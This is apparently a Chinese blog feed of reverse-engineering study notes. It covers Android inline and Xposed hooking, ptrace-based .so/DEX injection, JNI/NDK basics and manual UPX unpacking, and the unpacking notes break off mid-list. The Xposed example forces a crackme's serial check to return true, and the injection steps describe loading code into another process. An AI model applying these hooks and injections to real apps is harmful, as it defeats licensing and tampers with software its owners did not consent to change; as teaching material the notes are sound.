<li>修改函数起始处的指令。 使用一个跳转指令去执行替换函数。 执行后， 根据需求， 可以选择 跳转回来或者放弃执行原函数。 例如， 对 ARM模式下的 ARM 指令， 可以使用 ld 「 pc, XXX  指令进行替换（XXX 表示要转去执行的函数的地址， 即之前在程序中编写的替换函数的地· 址）。 修改后， 别忘了刷新缓存。 在 ARM 平台上， 需要执行 cacheflush（）函数来刷新修 改后的目标函数的缓存。 </li>
<li>使用 mprotect（）函数将目标函数代码段的属性改为只读与可执行。 如果不将属性修改回去， 在开启了 SELinux 的 Android 设备上， 程序的运行可能会因为代码段是可写与可执行的而 失败。</li>
</ol>
<h2 id="Xposed-Hook框架"><a href="#Xposed-Hook框架" class="headerlink" title="Xposed Hook框架"></a>Xposed Hook框架</h2><p>需要root设备</p>
<p><strong>支持 Android Java层的Dalvik Hook和ART Hook，总的来说就像是在目标函数执行前后插入了想要的代码，或者直接替换原来的方法。</strong></p>
<p>使用步骤：</p>
<ol>
<li>为其编写插件， Hook 我们所关心的 Java 方法。 </li>
<li>通过 XC_MethodHook 接 口提供的 beforeHookedMethod（）方法， 可以在 Hook 的方法执行前添加想要执行的代码逻辑。</li>
<li>也可 以使用 XC_MethodHook 接口提供的 afterHookedMethod（）方法， 在 Hook 的方法执行后添加相应的处 理代码。 </li>
<li>也可以使用XC_MethodReplacement直接替换方法的所有实现。</li>
</ol>
<p>示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CheckSNHook</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">XC_MethodReplacement</span> <span class="variable">replacementTrue</span> <span class="operator">=</span> XC_MethodReplacement.returnConstant(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CheckSNHook</span><span class="params">(ClassLoader cl)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;hooking checkSN.&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> (Class&lt;?&gt;) XposedHelpers.findClass(<span class="string">&quot;com.droider.crackme0201.MainActivity&quot;</span>, cl);</span><br><span class="line">            <span class="comment">//直接替换目标函数的返回值为true</span></span><br><span class="line">            XposedBridge.hookAllMethods(clz, <span class="string">&quot;checkSN&quot;</span>, replacementTrue);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            XposedHelpers.findAndHookMethod(clz,</span></span><br><span class="line"><span class="comment">                    &quot;checkSN&quot;,</span></span><br><span class="line"><span class="comment">                    String.class, String.class,</span></span><br><span class="line"><span class="comment">                    new XC_MethodHook() &#123;</span></span><br><span class="line"><span class="comment">                        @Override</span></span><br><span class="line"><span class="comment">                        protected void afterHookedMethod(MethodHookParam param)</span></span><br><span class="line"><span class="comment">                                throws Throwable &#123;</span></span><br><span class="line"><span class="comment">                            XposedBridge.log(&quot;CheckSN afterHookedMethod called.&quot;);</span></span><br><span class="line"><span class="comment">                            String s1 = (String) param.args[0];</span></span><br><span class="line"><span class="comment">                            String s2 = (String) param.args[1];</span></span><br><span class="line"><span class="comment">                            param.setResult(true);</span></span><br><span class="line"><span class="comment">                            super.afterHookedMethod(param);</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                    &#125;);</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;hook checkSN done.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><h2 id="so动态注入"><a href="#so动态注入" class="headerlink" title="so动态注入"></a>so动态注入</h2><p>与Windows dll注入类似</p>
<p>步骤：</p>
<ol>
<li>编写Native代码， 定义so 加载后需要执行的函数， 并将其编译成so文件。</li>
<li>编写注入程序， 实现远程进程注入。 注入程序使用Native代码编写， 并需要使用ptrace系 统的进程调试接口函数。</li>
<li>将so文件注入目标进程。</li>
<li>运行so文件中指定的函数。</li>
</ol>
<p>注入程序的注入流程：</p>
<ol>
<li>调用ptrace_attach（）附加进程。</li>
<li>调用 ptrace_getregs（）获取目标进程的寄存器信息， 并将它们保存起来。 在注入过程中 ， 它们的值会被修改。 注入后 ， 需要将它们恢复为原始值。 </li>
<li>获取目标进程mmap（）函数的地址 ， 并调用它为so文件分配内存空间。</li>
<li>调用ptrace_writedata（）， 将so文件的内容写入目标进程。</li>
<li>获取目标进程dlopen（）与dlsym（）等函数的地址。</li>
<li>调用ptrace_writedata（）， 将需要执行的函数的参数信息写入目标进程。</li>
<li>调用dlopen（）与dlsym（）获取需要执行的函数在so文件中加载后的地址。 ③调用ptrace_setregs（）恢复进程的寄存器信息。 </li>
<li>调用ptrace_detach（）取消对目标进程的附加。</li>
</ol>
<h2 id="DEX注入"><a href="#DEX注入" class="headerlink" title="DEX注入"></a>DEX注入</h2><p>将dex文件或者apk文件加载到目标apk中运行的技术称为”DEX注入”</p>
<p>步骤如下：</p>
<ol>
<li>编写Java代码， 并将其编译成DEX或APK文件。 </li>
<li>编写 Native代码， 定义so加载后需要执行的函数（它的内容必须包含加载DEX的代码）， 将其编译成so文件。 调用系统的DexClassLoader、 来加载DEX或APK文件。</li>
<li>编写注入程序， 实现远程进程注入。 这一步与so动态库注入是一样的。 </li>
<li>将so文件注入目标进程。</li>
<li>运行so文件中指定的函数。</li>
</ol>
<h2 id="Frida注入框架"><a href="#Frida注入框架" class="headerlink" title="Frida注入框架"></a>Frida注入框架</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8888 listenaddress=10.0.2.15 connectport=21513 connectaddress=127.0.0.1</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/feicong/androidbook">https://github.com/feicong/androidbook</a></p>
<p>Android软件安全权威指南-非虫</p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>HOOK &amp; 注入</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>HOOK &amp; 注入</tag>
      </tags>
  </entry>
  <entry>
    <title>NDK开发</title>
    <url>/2022/05/09/NDK%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>静态方法可以直接由类名来进行调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">testStaticNative</span><span class="params">(<span class="type">int</span> a)</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//表示的是使用自己的名字来编译，</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT jint JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_kanxue_secondshell_180_MainActivity_testStaticNative</span><span class="params">(JNIEnv *env, jclass clazz,jint a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement testStaticNative()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果要在.cpp文件中用c的函数的话，需要在加入头文件的地方进行如下操作</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span>&#123;</span><br><span class="line">	<span class="meta">#<span class="keyword">include</span><span class="string">&lt;xxxx.h&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>获取类名的方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getClassByreflection</span><span class="params">(String className)</span>&#123;</span><br><span class="line">    <span class="comment">//className，包含包名的全称</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> MainActivity.class.getClassLoader().loadClass(className);</span><br><span class="line">          <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">          <span class="type">Class</span> <span class="variable">clazz2</span> <span class="operator">=</span> Test.class; <span class="comment">//直接知道在同一个项目里面，并且知道类名</span></span><br><span class="line">     &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">          e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取类中的相关变量，方法等</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//能够获得包括私有的方法，但是没有继承的方法</span></span><br><span class="line">Class[] declaredClasses = clazz.getDeclaredClasses();</span><br><span class="line">Field[] declaredFields = clazz.getDeclaredFields();</span><br><span class="line">Method[] declaredMethods = clazz.getDeclaredMethods();</span><br><span class="line">Constructor[] declaredConstructors = clazz.getDeclaredConstructors();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//只能获取public的</span></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Class</span>&gt; aClass = clazz.getClass();</span><br><span class="line">Field[] fields = clazz.getFields();</span><br><span class="line"><span class="comment">//获取所有的public方法，包括继承来的方法</span></span><br><span class="line">Method[] methods = clazz.getMethods();</span><br><span class="line">Constructor[] constructors = clazz.getConstructors();</span><br></pre></td></tr></table></figure>

<p>一般为了保险起见都会将获取到的方法或者变量设置为setAccessible(true)，就可以修改了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">privateStaticField_field.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p><strong>在jni中调用Java中的方法</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//包名需要用‘/’来分隔</span></span><br><span class="line">jclass TestJclass = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/kanxue/reflectiontest/Test&quot;</span>);</span><br><span class="line">jfieldID publicStaticField_jfieldID = env-&gt;<span class="built_in">GetStaticFieldID</span>(TestJclass, <span class="string">&quot;publicStaticField&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">jstring publicStaticField_content = (jstring) env-&gt;<span class="built_in">GetStaticObjectField</span>(TestJclass, publicStaticField_jfieldID);</span><br><span class="line"><span class="comment">//Java中的字符串转换成，c++中的字符串</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *content_ptr = env-&gt;<span class="built_in">GetStringUTFChars</span>(publicStaticField_content, <span class="literal">nullptr</span>);</span><br></pre></td></tr></table></figure>

<p>jni函数描述符：</p>
<blockquote>
<p>格式为：（参数）返回值</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String test()      Ljava/lang/String;</span><br><span class="line">int f(int i,Object object)    (ILjava/lang/Object;)I</span><br></pre></td></tr></table></figure>

<h1 id="JavaVM-amp-JNIEnv"><a href="#JavaVM-amp-JNIEnv" class="headerlink" title="JavaVM &amp; JNIEnv"></a>JavaVM &amp; JNIEnv</h1><ul>
<li><p>JavaVM  &#x3D; JNIInvokeInterface*:是虚拟机在JNI层的一个代表，一个进程只有一个，所有的线程共用一个</p>
</li>
<li><p>JNIEnv &#x3D; JNINativeInterface*：指向了本地方法的一个函数表，该函数表中的每一个成员指向一个jni函数，本地方法通过JNI函数来访问JVM中的数据结构</p>
<ul>
<li>注意在c和c++中对env的使用方法不同，在C中env是一个二级指针，而在c++中是一个一级指针</li>
<li>只在创建他的线程中生效，不能进行跨线程传递，<strong>不同线程之间彼此独立</strong></li>
<li>在native中创建的线程，如果要访问JNI，必须要使用AttachCurrentThread进行关联，并且使用DetachCurrentThread解除附加</li>
</ul>
</li>
</ul>
<h1 id="JNI调用Java方法"><a href="#JNI调用Java方法" class="headerlink" title="JNI调用Java方法"></a>JNI调用Java方法</h1><p>基本都是通过env的丰富的函数来进行完成，具体使用的时候可以之间查看源码</p>
<p><strong>不外乎get set方法</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT <span class="type">void</span> JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_nativetest_MainActivity_newObject</span><span class="params">(JNIEnv *env, jobject thiz)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement newObject()</span></span><br><span class="line">    <span class="comment">//创建Java类里面的对象，有两种方法 NewObject  AllocObject</span></span><br><span class="line">    jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/nativetest/Test&quot;</span>);</span><br><span class="line">    jmethodID mid = env-&gt;<span class="built_in">GetMethodID</span>(clazz,<span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>);</span><br><span class="line">    jstring jstring1 = env-&gt;<span class="built_in">NewStringUTF</span>(<span class="string">&quot;I am from jni&quot;</span>);</span><br><span class="line">    jobject testObject = env-&gt;<span class="built_in">NewObject</span>(clazz,mid,jstring1);</span><br><span class="line">    <span class="keyword">if</span>(testObject!= <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>, <span class="string">&quot;nativetest：&quot;</span>, <span class="string">&quot;env-&gt;NewObject(clazz,mid,jstring1); success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jobject testObject1 = env-&gt;<span class="built_in">AllocObject</span>(clazz);</span><br><span class="line">    <span class="keyword">if</span>(testObject1!= <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>, <span class="string">&quot;nativetest：&quot;</span>, <span class="string">&quot;env-&gt;AllocObject(clazz); success&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>, <span class="string">&quot;nativetest：&quot;</span>, <span class="string">&quot;env-&gt;AllocObject(clazz); fialed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>jni调用Java函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用非静态的Java方法</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CallVoidMethod</span><span class="params">(jobject obj, jmethodID methodID, ...)</span>;</span><br><span class="line"><span class="comment">//调用静态方法</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CallStaticVoidMethod</span><span class="params">(jclass clazz, jmethodID methodID, ...)</span>;</span><br><span class="line"><span class="comment">//调用父类的方法</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CallNonvirtualVoidMethod</span><span class="params">(jobject obj, jclass clazz,jmethodID methodID, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取MainActivity的父类</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">mainActivity_clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/example/nativetest/MainActivity&quot;</span>);</span><br><span class="line"><span class="type">jclass</span> <span class="variable">mainActivity_clazz2</span> <span class="operator">=</span> env-&gt;GetObjectClass(thiz);</span><br><span class="line"><span class="comment">//1.直接获取</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivity_super_clazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;androidx/appcompat/app/AppCompatActivity&quot;</span>);</span><br><span class="line"><span class="comment">//2.通过MainActivity获取</span></span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivity_super_clazz2</span> <span class="operator">=</span> env-&gt;GetSuperclass(mainActivity_clazz);</span><br></pre></td></tr></table></figure>

<h1 id="JNI中内存管理"><a href="#JNI中内存管理" class="headerlink" title="JNI中内存管理"></a>JNI中内存管理</h1><ol>
<li><p>局部引用：Local Reference</p>
<ul>
<li>通过NewLocalRef和各种JNI接口创建的（FindClass, NewObject, GetObjuectClass和NewCharArray等）</li>
<li>会阻止GC回收所引用的对象</li>
<li>局部引用只能在当前函数中使用，函数返回后局部引用所引用的对象会被JVM自动释放，或调用DeleteLocalRef手动释放</li>
<li>不能跨线程使用</li>
<li>JNI提供了一系列函数来管理局部引用的生命周期。包括：EnsureLocalCapacity, NewLocalRef, PushLocalFrame, PopLocalFrame, DeleteLocalRef</li>
<li>一般来说会有一个局部引用的容量，如果局部引用的数目大于这个容量将会造成程序崩溃</li>
</ul>
</li>
<li><p>全局引用：Global Reference</p>
</li>
</ol>
<ul>
<li><p>调用NewGlobalRef基于局部引用创建，会阻止GC回收所引用的对象。</p>
</li>
<li><p>全局引用可以进行跨函数、跨线程使用，</p>
</li>
<li><p>ART不会自动释放，必须调用DeleteGlobalRef手动释放</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">jclass Testclazz ;</span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span></span>&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>, <span class="string">&quot;nativetest:&quot;</span>, <span class="string">&quot;onload&quot;</span>);</span><br><span class="line">    JNIEnv *env = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span> **&gt;(&amp;env), JNI_VERSION_1_6==JNI_OK))&#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>,<span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;vm-&gt;GetEnv(reinterpret_cast&lt;void **&gt;(&amp;env), JNI_VERSION_1_6==JNI_OK):SUCCESS&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    jclass  temp = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/nativetest/Test&quot;</span>);</span><br><span class="line">    Testclazz = <span class="built_in">static_cast</span>&lt;jclass&gt;(env-&gt;<span class="built_in">NewGlobalRef</span>(temp));</span><br><span class="line">    <span class="comment">//用完记得删除</span></span><br><span class="line"><span class="comment">//    env-&gt;DeleteGlobalRef(Testclazz);</span></span><br><span class="line">    jint result = JNI_VERSION_1_6;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>弱全局引用：Weak Global Reference<ul>
<li>调用NewWeakGlobalRef基于局部引用或全局引用创建，不会阻止GC回收所引用的对象</li>
<li>可以跨方法，跨线程调用。</li>
<li>引用不会自动释放，在ART认为应该回收他的时候进行回收和释放，或者调用DeleteWeakGlobalRef手动释放</li>
</ul>
</li>
</ol>
<h1 id="Dalvik动态注册与静态注册"><a href="#Dalvik动态注册与静态注册" class="headerlink" title="Dalvik动态注册与静态注册"></a>Dalvik动态注册与静态注册</h1><p>对于任意一个JNI函数来说，在该函数被调用前，必须要完成Java函数与SO文件中地址的绑定</p>
<ul>
<li>被动绑定：有Dalvik&#x2F;ART虚拟机在调用前查找并完成地址的绑定，</li>
<li>主动绑定：即由app自己完成地址的绑定</li>
</ul>
<p>静态注册：</p>
<p>对应的函数名：java+包名+类名+方法名，用“__”进行分隔，如果名称中本来就由下划线，则将使用下划线加数字替换</p>
<p>不够安全，IDA可直接定位函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_nativetest_MainActivity_testJNI</span><span class="params">(JNIEnv *env, jclass clazz, jstring str)</span></span></span><br></pre></td></tr></table></figure>

<p>动态注册：</p>
<ul>
<li>通过RegisterNatives方法来手动完成native方法和so中的方法的绑定，这样虚拟机就可以通过这个函数映射关系直接找到相应的方法了</li>
<li>通常是在JNI_Onload方法中完成动态注册，事实上只需要在该jni函数被调用前的任意时间完成注册即可，甚至是多次注册到不同的地址都是可以的</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span></span>&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>, <span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;onload&quot;</span>);</span><br><span class="line">    JNIEnv *env = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **)(&amp;env), JNI_VERSION_1_6)==JNI_OK)&#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>,<span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;vm-&gt;GetEnv(reinterpret_cast&lt;void **&gt;(&amp;env), JNI_VERSION_1_6==JNI_OK):SUCCESS&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    jclass  temp = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/nativetest/Test&quot;</span>);</span><br><span class="line">    Testclazz = <span class="built_in">static_cast</span>&lt;jclass&gt;(env-&gt;<span class="built_in">NewGlobalRef</span>(temp));</span><br><span class="line">    <span class="comment">//用完记得删除</span></span><br><span class="line"><span class="comment">//    env-&gt;DeleteGlobalRef(Testclazz);</span></span><br><span class="line">    jint result = JNI_VERSION_1_6;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将下面的函数进行动态注册,注意函数要先声明，否则找不到该函数</span></span><br><span class="line"><span class="comment"> * public native String stringFromJNI();</span></span><br><span class="line"><span class="comment">    public static native String testJNI(String str);</span></span><br><span class="line"><span class="comment">    public native void newObject();</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">   typedef struct &#123;</span></span><br><span class="line"><span class="comment">        const char* name;</span></span><br><span class="line"><span class="comment">        const char* signature;</span></span><br><span class="line"><span class="comment">        void*       fnPtr;</span></span><br><span class="line"><span class="comment">    &#125; JNINativeMethod;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    jint RegisterNatives(jclass clazz, const JNINativeMethod* methods,jint nMethods)</span></span><br><span class="line"><span class="comment">    jint UnregisterNatives(jclass clazz)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    jclass mainActivity_clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/nativetest/MainActivity&quot;</span>);</span><br><span class="line">    JNINativeMethod methods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;stringFromJNI&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, (<span class="type">void</span> *)stringFromJNI&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;testJNI&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>,(<span class="type">void</span> *)testJNI&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;newObject&quot;</span>,<span class="string">&quot;()V&quot;</span>,(<span class="type">void</span> *)newObject&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    env-&gt;<span class="built_in">RegisterNatives</span>(mainActivity_clazz,methods,(<span class="built_in">sizeof</span>(methods)/<span class="built_in">sizeof</span>(JNINativeMethod)));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数开头的时候加上，就可以更进一步保护app，在ida中函数名就不是原来的那个了，</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__attribute__ ((<span class="built_in">visibility</span> (<span class="string">&quot;hidden&quot;</span>))) <span class="function">jstring <span class="title">stringFromJNI</span><span class="params">(JNIEnv* env,jobject <span class="comment">/* this */</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>jin执行顺序:</p>
<ul>
<li>最先执行<code>_init</code></li>
<li>后执行<code>initArrays_xx</code>(可以设置执行顺序)</li>
<li>再执行<code>JNI_OnLoad</code></li>
<li>最后执行的是普通函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _init(<span class="type">void</span>)&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>,<span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;_init&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//原本的优先级是从上到下，但是如果设置了constructor的参数，就会按照参数来执行，数字越小就先执行</span></span><br><span class="line">__attribute__((<span class="built_in">constructor</span>(<span class="number">2</span>),<span class="built_in">visibility</span>(<span class="string">&quot;hidden&quot;</span>))) <span class="function"><span class="type">void</span> <span class="title">initArrays_1</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>,<span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;initArrays_1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">__attribute__((<span class="built_in">constructor</span>(<span class="number">1</span>),<span class="built_in">visibility</span>(<span class="string">&quot;hidden&quot;</span>))) <span class="function"><span class="type">void</span> <span class="title">initArrays_2</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>,<span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;initArrays_2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span></span>&#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>, <span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;onload&quot;</span>);</span><br><span class="line">    JNIEnv *env = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **)(&amp;env), JNI_VERSION_1_6)==JNI_OK)&#123;</span><br><span class="line">        __android_log_print(<span class="number">4</span>,<span class="string">&quot;nativetest&quot;</span>, <span class="string">&quot;vm-&gt;GetEnv(reinterpret_cast&lt;void **&gt;(&amp;env), JNI_VERSION_1_6==JNI_OK):SUCCESS&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    jint result = JNI_VERSION_1_6;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">2022-05-14 15:11:27.617 4395-4395/com.example.nativetest I/nativetest: _init</span></span><br><span class="line"><span class="comment">2022-05-14 15:11:27.617 4395-4395/com.example.nativetest I/nativetest: initArrays_2</span></span><br><span class="line"><span class="comment">2022-05-14 15:11:27.617 4395-4395/com.example.nativetest I/nativetest: initArrays_1</span></span><br><span class="line"><span class="comment">2022-05-14 15:11:27.617 4395-4395/com.example.nativetest I/nativetest: onload</span></span><br><span class="line"><span class="comment">/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Android</category>
        <category>NDK</category>
      </categories>
      <tags>
        <tag>code</tag>
        <tag>NDK</tag>
      </tags>
  </entry>
  <entry>
    <title>PE脱壳</title>
    <url>/2018/05/08/PE%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<h1 id="手脱UPX壳"><a href="#手脱UPX壳" class="headerlink" title="手脱UPX壳"></a>手脱UPX壳</h1><blockquote>
<p> 要在XP上脱壳，不然基地址有问题，可以直接改就可以</p>
</blockquote>
<p>调试工具是PEID和OD</p>
<ul>
<li><p>方法1：单步跟踪,只是让其实现向下的 </p>
</li>
<li><p>方法2：ESP定律法，在关键句的下一行，在或者ESP突变，就是只有他变红</p>
<ul>
<li>dd XXXXX（ESP的值）</li>
<li>hr XXXXX</li>
<li>右键在数据窗口中跟随然后设置硬件访问断点，在单步就可以到达OEP，（记得要删除硬件断点debug里面）</li>
</ul>
</li>
<li><p>方法3：2次内存镜像法</p>
<ul>
<li>在内存窗口中找到程序的第一个.rsrc资源文件资源，下断点，运行shift+f9，来到这个地方然后又再一次，在再upx0的地方下断（0040100这个地方），在进行单步</li>
</ul>
</li>
<li><p>方法4：一步直达法（upxde aspsk的壳）</p>
<ul>
<li>查找popad</li>
</ul>
</li>
<li><p>5使用loadpe </p>
</li>
<li><p>先修正一下镜像大小，然后完整转存</p>
</li>
<li><p>失败，然后再od中找到OEP的那个地方记录地址，然后使用一个工具，先写下正确的OEP的地址</p>
</li>
